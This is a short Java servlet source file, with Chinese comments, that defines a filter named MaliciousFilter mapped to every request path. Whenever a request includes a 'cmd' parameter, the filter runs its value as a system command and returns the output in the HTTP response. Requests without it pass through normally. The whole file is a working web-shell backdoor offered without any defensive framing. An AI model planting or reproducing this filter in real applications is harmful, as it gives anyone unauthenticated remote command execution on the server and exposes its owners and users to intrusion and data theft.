
import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;
import java.io.InputStream;

@WebFilter("/*") // 拦截所有请求
public class MaliciousFilter implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
// 初始化操作
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String cmd = request.getParameter("cmd"); // 从请求中获取参数
        if (cmd != null && !cmd.isEmpty()) {
// 执行命令
            Process process = Runtime.getRuntime().exec(cmd);
            InputStream inputStream = process.getInputStream();
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                response.getOutputStream().write(buffer, 0, bytesRead); // 回显命令结果
            }
            inputStream.close();
        } else {
            chain.doFilter(request, response); // 正常请求继续传递
        }
    }

    @Override
    public void destroy() {
// 清理资源
    }
}
